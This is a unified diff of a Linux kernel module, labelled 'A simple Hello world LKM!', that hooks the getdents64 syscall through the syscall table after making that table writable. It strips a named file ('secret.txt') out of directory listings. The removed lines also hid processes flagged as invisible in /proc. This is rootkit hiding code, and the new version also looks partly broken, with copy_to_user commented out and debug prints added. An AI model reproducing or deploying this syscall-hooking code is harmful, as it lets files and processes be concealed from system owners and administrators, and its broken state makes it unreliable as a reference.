@@ -1,69 +1,32 @@
-#include <linux/module.h>
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/moduleparam.h>
-#include <linux/unistd.h>
-#include <linux/semaphore.h>
-#include <linux/dirent.h>
-#include <asm/cacheflush.h>
-#include <linux/version.h>
-#include <linux/kallsyms.h>
-#include <linux/sched/signal.h>
-#include <linux/proc_ns.h>
-#include <linux/fs_struct.h>
-#include <asm/current.h>
-#include <linux/sched.h>
-#include <linux/security.h>
-#define INVISIBLE 0x10000000
-#define HIDE_ME "secret.txt"
-struct files_struct;
+#include "hide_file.h"
 unsigned long *sys_call_table;
-asmlinkage long unsigned (*org_getdents64) (unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
-struct task_struct * find_task(pid_t pid)
-{
-    struct task_struct *p = current;
-    for_each_process(p){
-        if (p->pid == pid)
-            return p;
-    }
-    return NULL;
-}
-int is_invisible(pid_t pid)
-{
-    struct task_struct *task;
-    if (!pid)
-        return 0;
-    task = find_task(pid);
-    if (!task)
-        return 0;
-    if (task->flags & INVISIBLE)
-        return 1;
-    return 0;
-}
-asmlinkage long sys_getdents64_hook (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
-{
-    int ret = org_getdents64(fd, dirent, count), err, proc =0;
-    struct linux_dirent64 *dir, *kdirent, *prev =NULL;
-    struct inode* d_inode;
-    unsigned long i =0;
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-        d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-    #else
-	    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-    #endif
+asmlinkage long unsigned (*org_getdents64) (const struct pt_regs* pt_regs);
 
+asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
+{
+    int  ret = org_getdents64(pt_regs);
+    int err;
+    struct linux_dirent64 *dir = (struct linux_dirent64 *)pt_regs->si, *kdirent, *prev = NULL;
+    unsigned long i =0;
+    
     //using the real syscall for getting the info
     if (ret <=0)
         return ret;
     kdirent = kvzalloc(ret, GFP_KERNEL); //alloc memory to kdirent
     if (kdirent == NULL)
         return ret;
-    err = copy_from_user(kdirent, dirent, ret);//copy from user space: >ret< from >dirent< to >kdirent<
+    err = copy_from_user((void *) kdirent, (const void __user *) dir, (unsigned long) ret);//copy from user space: >ret< from >dirent< to >kdirent<
+    printk(KERN_ALERT "copy form user %u", err);
+    printk(KERN_ALERT "copy form user 1: %u", err-ret);
+
     if (err)
-        goto out;
+        {
+            kvfree(kdirent);
+            return ret;
+        }
     
-    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
-        proc = 1;
+   /* if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+        proc = 1;*/
 
     while (i < ret)
     {
@@ -77,8 +40,10 @@ asmlinkage long sys_getdents64_hook (unsigned int fd, struct linux_dirent64 __us
          (explain later how) and then contiune*/
         dir = (void*) kdirent +i;
         // in strcmp return 0 means strings are equal
-        if (((!proc && (memcmp(HIDE_ME, dir->d_name, strlen(HIDE_ME))) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
-        {  
+        printk(KERN_ALERT "runnig");
+        if (((memcmp(HIDE_ME,(char *) dir->d_name, strlen(HIDE_ME))) == 0)) /*||(proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))*/
+        { 
+            printk(KERN_ALERT "found file"); 
             if (dir == kdirent){
                 ret -= dir->d_reclen;
                 memmove(dir, (void*)dir + dir->d_reclen, ret);// putting in dir the next dir in the buff
@@ -91,12 +56,14 @@ asmlinkage long sys_getdents64_hook (unsigned int fd, struct linux_dirent64 __us
             prev = dir;
         i+=dir->d_reclen;//incrise the offset for the while expersion
     }
-    err = copy_to_user(dirent, kdirent, ret);
+    ///err = copy_to_user(dirent, kdirent, (unsigned long) ret);
     if (err)//using out for regular out and not for error out
-        goto out;
-out:
-    kvfree(kdirent);
+    {
+        kvfree(kdirent);
+        return ret;
+    }
     return ret;
+
 }
 
 int set_page_write(unsigned long addr)
@@ -106,6 +73,7 @@ int set_page_write(unsigned long addr)
     if (pte->pte &~ _PAGE_RW)
     {
         pte->pte |= _PAGE_RW;
+        printk(KERN_ALERT "modify the page frame to wirte");
         return 1;
     }
     return 0;
@@ -115,6 +83,8 @@ void set_page_no_write(unsigned long addr)
     unsigned int level;
     pte_t *pte = lookup_address(addr, &level);
     pte->pte = pte->pte &~_PAGE_RW;
+    printk(KERN_ALERT "modify the page frame to read only");
+
 }
 int replace_getdents_syscall(void)
 {
@@ -127,7 +97,7 @@ int replace_getdents_syscall(void)
             //unsigned long orig_cr0 = read_cr0();
             //write_cr0(orig_cr0 &( ~0x10000));
             printk(KERN_ALERT "edit cr0 to write ");
-            org_getdents64 = (long unsigned int (*)(unsigned int,  struct linux_dirent64 *, unsigned int))sys_call_table[__NR_getdents64];
+            org_getdents64 = (long unsigned int (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
             sys_call_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
             set_page_no_write((unsigned long)sys_call_table);
             printk(KERN_ALERT "edit cr0 to no write ");
@@ -175,3 +145,6 @@ MODULE_AUTHOR("Akshat Sinha");
 MODULE_DESCRIPTION("A simple Hello world LKM!"); 
 MODULE_LICENSE("GPL"); 
 MODULE_VERSION("0.1"); 
+/*out:
+    kvfree(kdirent);
+    return ret;*/
